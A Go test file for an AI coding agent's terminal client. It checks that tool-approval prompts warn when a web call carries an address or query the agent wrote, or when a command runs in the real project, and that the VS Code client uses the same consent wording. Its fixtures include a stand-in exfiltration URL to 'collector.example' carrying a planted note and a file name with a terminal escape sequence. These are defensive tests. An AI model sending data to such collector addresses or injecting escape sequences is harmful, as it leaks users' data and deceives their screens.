package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"mochiii/protocol"
)

// WHY YOU ARE BEING ASKED. Three approvals the configuration does not cover
// (the daemon's webegress.go and mcp.Builtin.InPlace), and one line in the
// review. Each is a fact the daemon resolved and a sentence this client says;
// a prompt that asks without saying why is a prompt that gets a reflexive yes.

func webRequest(tool, args, why string) protocol.ToolApprovalRequest {
	return protocol.ToolApprovalRequest{
		CallID: "c1", Server: "builtin", Tool: tool, Arguments: args, Lane: protocol.LaneFirstParty,
		ReachesNetwork: true, ReadOnlyHint: true, EgressReview: why, Iteration: 2, MaxIterations: 8,
	}
}

func TestTheApprovalPanelSaysWhyAWebCallIsAskedAbout(t *testing.T) {
	const url = "https://collector.example/c?d=PLANTED-NOTE-777"
	panel := renderApprovalPanel(webRequest("web_fetch", `{"url":"`+url+`"}`, protocol.EgressReviewAddress))
	for _, want := range []string{"Open web page: " + url, "LEAVES YOUR MACHINE", "THE AGENT WROTE THIS ADDRESS ITSELF", "nothing of yours"} {
		if !strings.Contains(panel, want) {
			t.Errorf("the panel for an address the model wrote does not say %q:\n%s", want, panel)
		}
	}

	panel = renderApprovalPanel(webRequest("web_search", `{"query":"what is PLANTED-NOTE-777"}`, protocol.EgressReviewQuery))
	for _, want := range []string{"Search the web for: what is PLANTED-NOTE-777", "LEAVES YOUR MACHINE", "WRITTEN AFTER THE AGENT READ FILES OR PAGES IN THIS TURN"} {
		if !strings.Contains(panel, want) {
			t.Errorf("the panel for a query written after a read does not say %q:\n%s", want, panel)
		}
	}

	// A web call with no such reason says only what it always said -- and so
	// does a value this client does not know, from a newer daemon.
	for _, why := range []string{"", "something-newer"} {
		panel = renderApprovalPanel(webRequest("web_search", `{"query":"q"}`, why))
		if !strings.Contains(panel, "LEAVES YOUR MACHINE") || strings.Contains(panel, "THE AGENT WROTE") || strings.Contains(panel, "WRITTEN AFTER") {
			t.Errorf("egress_review=%q changed the ordinary web prompt:\n%s", why, panel)
		}
	}
	// The one-shot prompt is built from the same risks.
	if risks := strings.Join(approvalRisks(webRequest("web_fetch", `{"url":"`+url+`"}`, protocol.EgressReviewAddress)), "\n"); !strings.Contains(risks, egressAddressRisk) {
		t.Errorf("approvalRisks lacks the address line: %s", risks)
	}
}

func TestTheApprovalPanelSaysWhenACommandRunsInTheRealProject(t *testing.T) {
	req := protocol.ToolApprovalRequest{
		CallID: "c1", Server: "builtin", Tool: "sandbox_exec", Arguments: `{"command":"go test ./..."}`,
		Lane: protocol.LaneFirstParty, Confined: true, InPlace: true, Iteration: 1, MaxIterations: 8,
	}
	panel := renderApprovalPanel(req)
	for _, want := range []string{"Run command: go test ./...", "RUNS IN YOUR REAL PROJECT", ".git/hooks"} {
		if !strings.Contains(panel, want) {
			t.Errorf("the panel for a command with no working copy does not say %q:\n%s", want, panel)
		}
	}
	// In a working copy the prompt is the one line it was.
	req.InPlace = false
	if panel = renderApprovalPanel(req); strings.Contains(panel, "REAL PROJECT") || strings.Contains(panel, "\n") {
		t.Errorf("a command in a working copy gained a warning:\n%s", panel)
	}
}

func TestTheReviewNamesWhatACommandChanged(t *testing.T) {
	text := workingCopyText(&protocol.WorkingCopyInfo{
		Checked: "go test ./...", Passed: true,
		ByCommand: []string{"m/m.go (go test ./...)", "evil\x1b[2Jname.go (make)"},
	})
	if !strings.Contains(text, byCommandNote+"m/m.go (go test ./...)") {
		t.Errorf("the review does not name the file a command changed:\n%s", text)
	}
	if strings.Contains(text, "\x1b") {
		t.Errorf("a file name's escape sequence reached the screen: %q", text)
	}
	if text := workingCopyText(&protocol.WorkingCopyInfo{Checked: "go test ./...", Passed: true}); strings.Contains(text, "changed by a command") {
		t.Errorf("a turn in which no command changed anything says one did:\n%s", text)
	}
}

// BOTH CLIENTS SAY THE SAME WORDS. The sentences are consent text; a VS Code
// user and a terminal user approving the same call must be told the same
// thing. Read from the extension's source, which is where its wording lives.
func TestBothClientsUseTheSameWordsForWhyYouAreAsked(t *testing.T) {
	read := func(rel string) string {
		t.Helper()
		b, err := os.ReadFile(filepath.Join("..", "vscode", filepath.FromSlash(rel)))
		if err != nil {
			t.Fatal(err)
		}
		// The extension writes one sentence across two string literals.
		return squashJSStrings(string(b))
	}
	webview := read("media/main.js")
	for name, sentence := range map[string]string{
		"egressAddressRisk": egressAddressRisk,
		"egressQueryRisk":   egressQueryRisk,
		"inPlaceRisk":       inPlaceRisk,
	} {
		if !strings.Contains(webview, sentence) {
			t.Errorf("clients/vscode/media/main.js does not carry the TUI's %s word for word:\n  %s", name, sentence)
		}
	}
	if spec := read("src/specWorkflow.ts"); !strings.Contains(spec, byCommandNote) {
		t.Errorf("clients/vscode/src/specWorkflow.ts does not carry the TUI's byCommandNote word for word:\n  %s", byCommandNote)
	}
	for _, field := range []string{"egress_review", "in_place", "by_command"} {
		if !strings.Contains(read("src/daemonClient.ts"), field) {
			t.Errorf("clients/vscode/src/daemonClient.ts does not declare %s", field)
		}
	}
}

// squashJSStrings joins a JavaScript string written as 'a ' + 'b' across lines
// into a b, so a sentence can be looked for whole.
func squashJSStrings(src string) string {
	var b strings.Builder
	lines := strings.Split(src, "\n")
	for i := 0; i < len(lines); i++ {
		line := lines[i]
		for strings.HasSuffix(strings.TrimRight(line, " "), "' +") && i+1 < len(lines) {
			head := strings.TrimSuffix(strings.TrimRight(line, " "), "' +")
			next := strings.TrimLeft(lines[i+1], " ")
			line = head + strings.TrimPrefix(next, "'")
			i++
		}
		b.WriteString(line)
		b.WriteByte('\n')
	}
	return b.String()
}
